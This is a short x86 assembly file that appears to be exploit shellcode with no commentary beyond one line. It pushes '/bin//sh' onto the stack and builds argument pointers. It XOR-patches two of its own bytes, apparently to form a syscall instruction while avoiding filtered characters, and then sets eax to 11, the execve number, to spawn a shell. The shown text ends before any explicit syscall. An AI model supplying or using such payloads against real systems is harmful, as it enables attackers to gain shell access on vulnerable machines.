global _start

section .text
_start:
; eax - shellcode base

push ebx
push dword 0x68732f2f
push dword 0x6e69622f
push esp
push esp
push ebx
dec ebx
dec ebx
xor byte [eax + 0x22], bl
xor byte [eax + 0x23], bl
pop eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
inc eax
